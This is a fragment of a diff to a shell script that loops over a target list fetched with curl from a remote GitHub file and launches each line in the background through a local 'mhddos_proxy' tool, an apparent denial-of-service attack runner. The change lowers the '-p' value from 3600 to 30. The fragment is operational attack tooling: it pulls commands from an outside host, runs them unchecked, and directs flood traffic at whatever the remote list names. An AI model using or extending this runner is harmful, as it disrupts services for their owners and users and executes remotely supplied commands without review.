@@ -71,7 +71,7 @@ do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py")")
            
             #echo $cmd_line
-            python3 ~/mhddos_proxy/$cmd_line"-p 3600"&
+            python3 ~/mhddos_proxy/$cmd_line"-p 30"&
    done
 echo -e "#####################################\n"
 sleep $restart_interval
